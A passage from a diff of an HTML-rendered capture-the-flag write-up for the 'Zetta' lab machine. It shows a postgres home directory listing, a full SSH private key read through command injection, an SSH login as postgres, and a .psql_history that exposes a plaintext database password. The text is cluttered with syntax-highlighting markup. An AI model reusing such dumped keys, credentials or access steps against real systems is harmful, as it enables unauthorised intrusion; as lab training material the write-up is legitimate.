+</span></span></span><span class="line"><span class="cl"><span class="w"> </span><span class="n">total</span><span class="w"> </span><span class="mi">20</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"> </span><span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span><span class="w">  </span><span class="mi">4</span><span class="w"> </span><span class="n">postgres</span><span class="w"> </span><span class="n">postgres</span><span class="w"> </span><span class="mi">4096</span><span class="w"> </span><span class="n">Jul</span><span class="w"> </span><span class="mi">27</span><span class="w">  </span><span class="mi">2019</span><span class="w"> </span><span class="p">.</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"> </span><span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span><span class="w"> </span><span class="mi">27</span><span class="w"> </span><span class="n">root</span><span class="w">     </span><span class="n">root</span><span class="w">     </span><span class="mi">4096</span><span class="w"> </span><span class="n">Aug</span><span class="w"> </span><span class="mi">27</span><span class="w"> </span><span class="mi">05</span><span class="p">:</span><span class="mi">39</span><span class="w"> </span><span class="p">..</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"> </span><span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span><span class="w">  </span><span class="mi">3</span><span class="w"> </span><span class="n">postgres</span><span class="w"> </span><span class="n">postgres</span><span class="w"> </span><span class="mi">4096</span><span class="w"> </span><span class="n">Jul</span><span class="w"> </span><span class="mi">27</span><span class="w">  </span><span class="mi">2019</span><span class="w"> </span><span class="mi">11</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"> </span><span class="n">lrwxrwxrwx</span><span class="w">  </span><span class="mi">1</span><span class="w"> </span><span class="n">root</span><span class="w">     </span><span class="n">root</span><span class="w">        </span><span class="mi">9</span><span class="w"> </span><span class="n">Jul</span><span class="w"> </span><span class="mi">27</span><span class="w">  </span><span class="mi">2019</span><span class="w"> </span><span class="p">.</span><span class="n">bash_history</span><span class="w"> </span><span class="o">-&gt;</span><span class="w"> </span><span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="no">null</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"> </span><span class="o">-</span><span class="n">rw</span><span class="o">-----</span><span class="c1">--  1 postgres postgres  744 Jul 27  2019 .psql_history
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="w"> </span><span class="n">drwx</span><span class="o">----</span><span class="c1">--  2 postgres postgres 4096 Jul 27  2019 .ssh
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="w"> </span><span class="n">total</span><span class="w"> </span><span class="mi">20</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"> </span><span class="n">drwx</span><span class="o">----</span><span class="c1">-- 2 postgres postgres 4096 Jul 27  2019 .
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="w"> </span><span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span><span class="w"> </span><span class="mi">4</span><span class="w"> </span><span class="n">postgres</span><span class="w"> </span><span class="n">postgres</span><span class="w"> </span><span class="mi">4096</span><span class="w"> </span><span class="n">Jul</span><span class="w"> </span><span class="mi">27</span><span class="w">  </span><span class="mi">2019</span><span class="w"> </span><span class="p">..</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"> </span><span class="o">-</span><span class="n">rw</span><span class="o">-----</span><span class="c1">-- 1 postgres postgres  747 Jul 27  2019 authorized_keys
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="w"> </span><span class="o">-</span><span class="n">rw</span><span class="o">-----</span><span class="c1">-- 1 postgres postgres 3389 Jul 27  2019 id_rsa
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="w"> </span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="c1">-- 1 postgres postgres  747 Jul 27  2019 id_rsa.pub
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="w"> </span><span class="o">-----</span><span class="n">BEGIN</span><span class="w"> </span><span class="n">OPENSSH</span><span class="w"> </span><span class="n">PRIVATE</span><span class="w"> </span><span class="k">KEY</span><span class="o">---</span><span class="c1">--
+</span></span></span><span class="line"><span class="cl"><span class="c1">b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAACFwAAAAdzc2gtcn
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">NhAAAAAwEAAQAAAgEAxyTwk</span><span class="o">/</span><span class="n">nCdFnnjTEyl8ShdNbEzcYLGv4qGAi</span><span class="o">+</span><span class="n">EuZd1XnqgsUQH1qu</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">wPwA2ytXyaz27qkkjs3y6lEtu3w4DBwXycqk3DMe</span><span class="o">/</span><span class="mi">5</span><span class="n">ir6JCtsV2</span><span class="o">+</span><span class="n">GnNFJxUfpF3X05lmqg</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">1</span><span class="n">Ua6rnyjYVmi4t6BxxoCvOd</span><span class="o">/</span><span class="n">X8WORcOselG9RZwk</span><span class="o">//</span><span class="n">gjIsElappX</span><span class="o">/</span><span class="n">flotyXdgEd0uyx6Ul</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">gXFb9WeX2EfSd3D8HpyclYhkaVq7ng0yzJAvF4hbEqMq1ERW</span><span class="o">/</span><span class="n">weWyE32XvDKb</span><span class="o">+</span><span class="n">aHLY44UB</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">iCQhdrIdiY3ctek4VUlBnCzULD4btFwrZyvxvrq</span><span class="o">+</span><span class="n">ievIEJtU3o3z6zh</span><span class="o">+</span><span class="n">s9</span><span class="o">/</span><span class="n">CQ0vze9ylXp</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">eceLFaoPr2BcPsSLmld9ac3O9263sgTNYWVG</span><span class="o">+</span><span class="n">g6TQvV</span><span class="o">+</span><span class="n">Un7Ut8Ap9OctDCzjw2Q8xU</span><span class="o">/</span><span class="n">cpt</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">ebWCkMhAgSGSNwxodztd1x9PqY0Vrje3aCSvlgP8tyl9FxXxA5fg4JvmAlhKLhAhtpFTs9</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">3</span><span class="n">Xro6Vcz8BGdOXOIqlaKbOTj2YmsI</span><span class="o">+</span><span class="n">exxzI7pl3gKtF6</span><span class="o">/</span><span class="n">vLu</span><span class="o">/</span><span class="n">kUQl2r</span><span class="o">/</span><span class="n">eXhW</span><span class="o">+</span><span class="n">seY7AsfUG</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">J6zOtUBgfSzYG6gqQr2tah7cbG6qCYwt9ShqgAshWZV66Y94nyZibYwTOPq7LvxJmIMLlJ</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">9</span><span class="n">xwbWRhLq7V</span><span class="o">+</span><span class="n">xvIB5eObmkjVVfnsz71XtXVI4wRBZ9s</span><span class="o">+</span><span class="n">vrTcZiwrCI228IWFaOCbwr8e4N</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">MAAAdQUkfH2VJHx9kAAAAHc3NoLXJzYQAAAgEAxyTwk</span><span class="o">/</span><span class="n">nCdFnnjTEyl8ShdNbEzcYLGv4q</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">GAi</span><span class="o">+</span><span class="n">EuZd1XnqgsUQH1quwPwA2ytXyaz27qkkjs3y6lEtu3w4DBwXycqk3DMe</span><span class="o">/</span><span class="mi">5</span><span class="n">ir6JCtsV</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">2</span><span class="o">+</span><span class="n">GnNFJxUfpF3X05lmqg1Ua6rnyjYVmi4t6BxxoCvOd</span><span class="o">/</span><span class="n">X8WORcOselG9RZwk</span><span class="o">//</span><span class="n">gjIsElap</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">pX</span><span class="o">/</span><span class="n">flotyXdgEd0uyx6UlgXFb9WeX2EfSd3D8HpyclYhkaVq7ng0yzJAvF4hbEqMq1ERW</span><span class="o">/</span><span class="n">w</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">eWyE32XvDKb</span><span class="o">+</span><span class="n">aHLY44UBiCQhdrIdiY3ctek4VUlBnCzULD4btFwrZyvxvrq</span><span class="o">+</span><span class="n">ievIEJtU3o</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">3</span><span class="n">z6zh</span><span class="o">+</span><span class="n">s9</span><span class="o">/</span><span class="n">CQ0vze9ylXpeceLFaoPr2BcPsSLmld9ac3O9263sgTNYWVG</span><span class="o">+</span><span class="n">g6TQvV</span><span class="o">+</span><span class="n">Un7Ut8</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Ap9OctDCzjw2Q8xU</span><span class="o">/</span><span class="n">cptebWCkMhAgSGSNwxodztd1x9PqY0Vrje3aCSvlgP8tyl9FxXxA5</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">fg4JvmAlhKLhAhtpFTs93Xro6Vcz8BGdOXOIqlaKbOTj2YmsI</span><span class="o">+</span><span class="n">exxzI7pl3gKtF6</span><span class="o">/</span><span class="n">vLu</span><span class="o">/</span><span class="n">k</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">UQl2r</span><span class="o">/</span><span class="n">eXhW</span><span class="o">+</span><span class="n">seY7AsfUGJ6zOtUBgfSzYG6gqQr2tah7cbG6qCYwt9ShqgAshWZV66Y94ny</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">ZibYwTOPq7LvxJmIMLlJ9xwbWRhLq7V</span><span class="o">+</span><span class="n">xvIB5eObmkjVVfnsz71XtXVI4wRBZ9s</span><span class="o">+</span><span class="n">vrTcZi</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">wrCI228IWFaOCbwr8e4NMAAAADAQABAAACAQDFo</span><span class="o">+</span><span class="n">Gn2o6kjr2BoTwG570dijDT0CMhbPI1</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">3</span><span class="n">CdX9o1V2qNlmVJA6</span><span class="o">+</span><span class="n">zX1sK6wa9klmaTwgZoO</span><span class="o">/</span><span class="n">lDl8F9evDdA9yQBq</span><span class="o">/</span><span class="n">LYmj3XnvuWfgoOV</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">L8ST5uZUZ8CC608F</span><span class="o">+</span><span class="mi">1</span><span class="n">kXkhSgK06yxRUld5LxGN1ywYXmdNiYYHSDCTCBL1CBQbENQwdxXz</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">DI</span><span class="o">/</span><span class="n">Ihyi</span><span class="o">//</span><span class="n">i2gf940ybAJYYnUajWHDvDQXa</span><span class="o">+</span><span class="mi">6</span><span class="n">ac</span><span class="o">/</span><span class="mi">1</span><span class="n">j</span><span class="o">+</span><span class="n">GntcbSO2MZJle2UTuhqZJODG0Sum</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">No9Ab5fpxKpk2uZqF4zHoqQbevZZmBNd7tJbwlJ9Pvhr2FAClh71S</span><span class="o">+</span><span class="n">WmVwvXMcviv2ZhYh</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">yca</span><span class="o">/</span><span class="n">tDZWUVCQHjAb6VvH4sQkgh0BPdY8nH52FWCWA0KZUvFWtzn5gZwHw</span><span class="o">+</span><span class="n">JMtNRMnoNyR3</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">wKLbRHAluUnEZZ6xFoo1UiWyYe3Yps0ARmuBMCQSnFq3QWRi9h7feja5g1cjGg27At2</span><span class="o">+</span><span class="n">yR</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">18</span><span class="n">bPkb98faep</span><span class="o">/</span><span class="n">kFld7Aja2z67SdAL2uB</span><span class="o">+</span><span class="n">V2uwKwLd46hmA0HEK0hAi0PaPfXEDQXyZZhZX</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">+</span><span class="n">s1vqVsWwrLUeUfR2wi</span><span class="o">+</span><span class="n">vDQDGeGm20Mb1ZlcDdQHLiF6addRcuDK0DjBD2UTDjKHaKH</span><span class="o">/</span><span class="n">pf</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">EGTNwPLHWoix</span><span class="o">/</span><span class="n">Ua</span><span class="o">+</span><span class="n">JZHdEpScmqkz</span><span class="o">/</span><span class="n">bgxJWclI0vN</span><span class="o">+</span><span class="n">KGwoK9scii</span><span class="o">+</span><span class="mi">0</span><span class="n">rF9DR7q</span><span class="o">+</span><span class="n">Vlujy</span><span class="o">+</span><span class="n">vUw</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">fYekfcNde2heW09mzQwQAAAQAKJJlsB4rpRS2jDN8YNa6Tlv6</span><span class="o">/</span><span class="n">yrQ</span><span class="o">/</span><span class="n">zQm3XyqNHVmLVred</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">gLrlTsCn5I2pumroQ0ikY6KwHqo</span><span class="o">/</span><span class="n">SZBdLARf3SKUW8C7RFsfPleT4</span><span class="o">/</span><span class="n">wz4FVvPrvnRt1x25</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">wEtzpEXzwcM</span><span class="o">+</span><span class="mi">0</span><span class="n">bvrnCle2</span><span class="o">/</span><span class="n">WO93i9</span><span class="o">/</span><span class="n">ngkaoq</span><span class="o">+</span><span class="n">eAyzUUbhtJ4D</span><span class="o">++</span><span class="n">KjkSgEybQO49Mm2NmFMz</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">vuMUKfIK5GOD1owJTFCobVKoyju85kWv28wYZyOr2Hb3HgERsm746SzoIZ6GDyTGonK0aw</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">8</span><span class="n">h7HZk52iiJfBtMkk5MU65iprMOE27b5PSADTQmepq7pgABRWyY3c8v3W</span><span class="o">+</span><span class="n">DvtFCsVzxchs</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">ElVpgNReaNX0Lg4iAAABAQDwvf4twBUem54a</span><span class="o">/</span><span class="n">SpQTEOZA3</span><span class="o">/</span><span class="mi">1</span><span class="n">oqJlsG14XUUV9drjT</span><span class="o">/</span><span class="mi">6</span><span class="n">dNy</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">zWIJaFGS3NObB1AsXYpIN6dOn0q12kRVH9OTUhFF9Ou3Wm6uytNVhpJOic3y09egJ</span><span class="o">/</span><span class="n">U9wM</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">tiymf8DxHhVx3mEX3Qr2GHPN6n3eYce</span><span class="o">+/</span><span class="n">JGaNugR2</span><span class="o">+</span><span class="mi">1</span><span class="n">keUk76orwN2paENfyuqAg4</span><span class="o">/</span><span class="n">k8</span><span class="o">/</span><span class="n">w</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">zDYvIzNsK0A8aiJ4hctJxHl4mlXwO0oGNtNFBUIrov4iI8P6gghzsNPGsuyTfBPayFBCF4</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">8</span><span class="n">nGT1ocY0ItJKfTejPhN7w5pdM6M7bT3uT7cUEGkZANP5AYUfsEhh8kpwsoER9HbKQipvz</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">xPSa16LeeciKbDAAABAQDTxAcJANWF</span><span class="o">//</span><span class="n">B58W</span><span class="o">+</span><span class="n">UYGN0DyZfFNljToCqUT71rIDkckyWv5fi</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">PbxoQzxhXW6BprnwlqCCnq22fhiJp</span><span class="o">+</span><span class="n">gJE49Ag3BgqW9sCbGFh</span><span class="o">/</span><span class="n">ft09kL</span><span class="o">/</span><span class="n">tv29vDOno32FC</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">PAcXDAMuGF46hURvgSjble8Z2ISmkGnV8XZ</span><span class="o">+</span><span class="n">ka</span><span class="o">/</span><span class="n">nqtDQRiZ51GMVgDz</span><span class="o">+</span><span class="n">tjfcrYDqoKO</span><span class="o">/</span><span class="n">r1</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">cqBDo5fVoYKc8K0id9cXLTwqD</span><span class="o">+</span><span class="n">W6zT1UCDExNTcwByrqDMSIOmj5FDndwVVg29YP7TUE8i</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">GolHzO58rsJVHYuiAGHBooDln7zL6CqmAhKgFUfLoAT</span><span class="o">+</span><span class="n">NRlHiXbltdSxZ7K0SWcNA32Trq</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">d5qRdqtIHNyxAAAAFUJhY2t1cCBLZXkgZm9yIEJhcm1hbgECAwQF</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">-----</span><span class="n">END</span><span class="w"> </span><span class="n">OPENSSH</span><span class="w"> </span><span class="n">PRIVATE</span><span class="w"> </span><span class="k">KEY</span><span class="o">---</span><span class="c1">--
+</span></span></span></code></pre></td></tr></table>
 </div>
 </div><p>After that I copied <code>id_rsa</code> key to name <code>id_rsa</code> key in my local machine and used. This was I got postgres shell</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
@@ -940,20 +873,20 @@ So for that I used that cat command in command injection and able to cat the RSA
 </span><span class="lnt">7
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">root@gr4n173:~$ ssh -i id_rsa postgres@zetta.htb
-Linux zetta 4.19.0-5-amd64 <span class="c1">#1 SMP Debian 4.19.37-5+deb10u1 (2019-07-19) x86_64</span>
-postgres@zetta:~$ whoami
-postgres
-postgres@zetta:~$ id
-<span class="nv">uid</span><span class="o">=</span>106<span class="o">(</span>postgres<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>113<span class="o">(</span>postgres<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>113<span class="o">(</span>postgres<span class="o">)</span>,112<span class="o">(</span>ssl-cert<span class="o">)</span>
-postgres@zetta:~$
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">root@gr4n173:~$ ssh -i id_rsa postgres@zetta.htb
+</span></span><span class="line"><span class="cl">Linux zetta 4.19.0-5-amd64 <span class="c1">#1 SMP Debian 4.19.37-5+deb10u1 (2019-07-19) x86_64</span>
+</span></span><span class="line"><span class="cl">postgres@zetta:~$ whoami
+</span></span><span class="line"><span class="cl">postgres
+</span></span><span class="line"><span class="cl">postgres@zetta:~$ id
+</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>106<span class="o">(</span>postgres<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>113<span class="o">(</span>postgres<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>113<span class="o">(</span>postgres<span class="o">)</span>,112<span class="o">(</span>ssl-cert<span class="o">)</span>
+</span></span><span class="line"><span class="cl">postgres@zetta:~$
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h2 id="postgres---root">Postgres -&gt; Root</h2>
 <p>Now I got the shell of user postgres and searched its home directory and got .psql_history.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
@@ -961,34 +894,34 @@ postgres@zetta:~$
 </span><span class="lnt">6
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-mysql" data-lang="mysql"><span class="n">postgres</span><span class="o">@</span><span class="n">zetta</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">cat</span> <span class="p">.</span><span class="n">psql_history</span> 
-<span class="k">CREATE</span> <span class="k">DATABASE</span> <span class="n">syslog</span><span class="p">;</span>
-<span class="err">\</span><span class="n">c</span> <span class="n">syslog</span>
-<span class="k">CREATE</span> <span class="k">TABLE</span> <span class="nf">syslog_lines</span> <span class="p">(</span> <span class="n">ID</span> <span class="n">serial</span> <span class="k">not</span> <span class="no">null</span> <span class="k">primary</span> <span class="k">key</span><span class="p">,</span> <span class="n">CustomerID</span> <span class="kt">bigint</span><span class="p">,</span> <span class="n">ReceivedAt</span> <span class="kt">timestamp</span> <span class="n">without</span> <span class="kt">time</span> <span class="n">zone</span> <span class="no">NULL</span><span class="p">,</span> <span class="n">DeviceReportedTime</span> <span class="kt">timestamp</span> <span class="n">without</span> <span class="kt">time</span> <span class="n">zone</span> <span class="no">NULL</span><span class="p">,</span> <span class="n">Facility</span> <span class="kt">smallint</span> <span class="no">NULL</span><span class="p">,</span> <span class="n">Priority</span> <span class="kt">smallint</span> <span class="no">NULL</span><span class="p">,</span> <span class="n">FromHost</span> <span class="kt">varchar</span><span class="p">(</span><span class="mi">60</span><span class="p">)</span> <span class="no">NULL</span><span class="p">,</span> <span class="n">Message</span> <span class="kt">text</span><span class="p">,</span> <span class="n">NTSeverity</span> <span class="kt">int</span> <span class="no">NULL</span><span class="p">,</span> <span class="n">Importance</span> <span class="kt">int</span> <span class="no">NULL</span><span class="p">,</span> <span class="n">EventSource</span> <span class="kt">varchar</span><span class="p">(</span><span class="mi">60</span><span class="p">),</span> <span class="n">EventUser</span> <span class="kt">varchar</span><span class="p">(</span><span class="mi">60</span><span class="p">)</span> <span class="no">NULL</span><span class="p">,</span> <span class="n">EventCategory</span> <span class="kt">int</span> <span class="no">NULL</span><span class="p">,</span> <span class="n">EventID</span> <span class="kt">int</span> <span class="no">NULL</span><span class="p">,</span> <span class="n">EventBinaryData</span> <span class="kt">text</span> <span class="no">NULL</span><span class="p">,</span> <span class="n">MaxAvailable</span> <span class="kt">int</span> <span class="no">NULL</span><span class="p">,</span> <span class="n">CurrUsage</span> <span class="kt">int</span> <span class="no">NULL</span><span class="p">,</span> <span class="n">MinUsage</span> <span class="kt">int</span> <span class="no">NULL</span><span class="p">,</span> <span class="n">MaxUsage</span> <span class="kt">int</span> <span class="no">NULL</span><span class="p">,</span> <span class="n">InfoUnitID</span> <span class="kt">int</span> <span class="no">NULL</span> <span class="p">,</span> <span class="n">SysLogTag</span> <span class="kt">varchar</span><span class="p">(</span><span class="mi">60</span><span class="p">),</span> <span class="n">EventLogType</span> <span class="kt">varchar</span><span class="p">(</span><span class="mi">60</span><span class="p">),</span> <span class="n">GenericFileName</span> <span class="kt">VarChar</span><span class="p">(</span><span class="mi">60</span><span class="p">),</span> <span class="n">SystemID</span> <span class="kt">int</span> <span class="no">NULL</span><span class="p">);</span>
-<span class="err">\</span><span class="n">d</span> <span class="n">syslog_lines</span>
-<span class="k">ALTER</span> <span class="k">USER</span> <span class="n">postgres</span> <span class="k">WITH</span> <span class="n">PASSWORD</span> <span class="s1">&#39;sup3rs3cur3p4ass@postgres&#39;</span><span class="p">;</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="line"><span class="cl"><span class="n">postgres</span><span class="o">@</span><span class="n">zetta</span><span class="p">:</span><span class="o">~</span><span class="err">$</span><span class="w"> </span><span class="n">cat</span><span class="w"> </span><span class="p">.</span><span class="n">psql_history</span><span class="w"> 
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">CREATE</span><span class="w"> </span><span class="k">DATABASE</span><span class="w"> </span><span class="n">syslog</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="err">\</span><span class="n">c</span><span class="w"> </span><span class="n">syslog</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">CREATE</span><span class="w"> </span><span class="k">TABLE</span><span class="w"> </span><span class="nf">syslog_lines</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="n">ID</span><span class="w"> </span><span class="n">serial</span><span class="w"> </span><span class="k">not</span><span class="w"> </span><span class="no">null</span><span class="w"> </span><span class="k">primary</span><span class="w"> </span><span class="k">key</span><span class="p">,</span><span class="w"> </span><span class="n">CustomerID</span><span class="w"> </span><span class="kt">bigint</span><span class="p">,</span><span class="w"> </span><span class="n">ReceivedAt</span><span class="w"> </span><span class="kt">timestamp</span><span class="w"> </span><span class="n">without</span><span class="w"> </span><span class="kt">time</span><span class="w"> </span><span class="n">zone</span><span class="w"> </span><span class="no">NULL</span><span class="p">,</span><span class="w"> </span><span class="n">DeviceReportedTime</span><span class="w"> </span><span class="kt">timestamp</span><span class="w"> </span><span class="n">without</span><span class="w"> </span><span class="kt">time</span><span class="w"> </span><span class="n">zone</span><span class="w"> </span><span class="no">NULL</span><span class="p">,</span><span class="w"> </span><span class="n">Facility</span><span class="w"> </span><span class="kt">smallint</span><span class="w"> </span><span class="no">NULL</span><span class="p">,</span><span class="w"> </span><span class="n">Priority</span><span class="w"> </span><span class="kt">smallint</span><span class="w"> </span><span class="no">NULL</span><span class="p">,</span><span class="w"> </span><span class="n">FromHost</span><span class="w"> </span><span class="kt">varchar</span><span class="p">(</span><span class="mi">60</span><span class="p">)</span><span class="w"> </span><span class="no">NULL</span><span class="p">,</span><span class="w"> </span><span class="n">Message</span><span class="w"> </span><span class="kt">text</span><span class="p">,</span><span class="w"> </span><span class="n">NTSeverity</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="no">NULL</span><span class="p">,</span><span class="w"> </span><span class="n">Importance</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="no">NULL</span><span class="p">,</span><span class="w"> </span><span class="n">EventSource</span><span class="w"> </span><span class="kt">varchar</span><span class="p">(</span><span class="mi">60</span><span class="p">),</span><span class="w"> </span><span class="n">EventUser</span><span class="w"> </span><span class="kt">varchar</span><span class="p">(</span><span class="mi">60</span><span class="p">)</span><span class="w"> </span><span class="no">NULL</span><span class="p">,</span><span class="w"> </span><span class="n">EventCategory</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="no">NULL</span><span class="p">,</span><span class="w"> </span><span class="n">EventID</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="no">NULL</span><span class="p">,</span><span class="w"> </span><span class="n">EventBinaryData</span><span class="w"> </span><span class="kt">text</span><span class="w"> </span><span class="no">NULL</span><span class="p">,</span><span class="w"> </span><span class="n">MaxAvailable</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="no">NULL</span><span class="p">,</span><span class="w"> </span><span class="n">CurrUsage</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="no">NULL</span><span class="p">,</span><span class="w"> </span><span class="n">MinUsage</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="no">NULL</span><span class="p">,</span><span class="w"> </span><span class="n">MaxUsage</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="no">NULL</span><span class="p">,</span><span class="w"> </span><span class="n">InfoUnitID</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="no">NULL</span><span class="w"> </span><span class="p">,</span><span class="w"> </span><span class="n">SysLogTag</span><span class="w"> </span><span class="kt">varchar</span><span class="p">(</span><span class="mi">60</span><span class="p">),</span><span class="w"> </span><span class="n">EventLogType</span><span class="w"> </span><span class="kt">varchar</span><span class="p">(</span><span class="mi">60</span><span class="p">),</span><span class="w"> </span><span class="n">GenericFileName</span><span class="w"> </span><span class="kt">VarChar</span><span class="p">(</span><span class="mi">60</span><span class="p">),</span><span class="w"> </span><span class="n">SystemID</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="no">NULL</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="err">\</span><span class="n">d</span><span class="w"> </span><span class="n">syslog_lines</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">ALTER</span><span class="w"> </span><span class="k">USER</span><span class="w"> </span><span class="n">postgres</span><span class="w"> </span><span class="k">WITH</span><span class="w"> </span><span class="n">PASSWORD</span><span class="w"> </span><span class="s1">&#39;sup3rs3cur3p4ass@postgres&#39;</span><span class="p">;</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
 </div>
 </div><p>and I have todo list from shell of roy .tudu.xml and got this.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
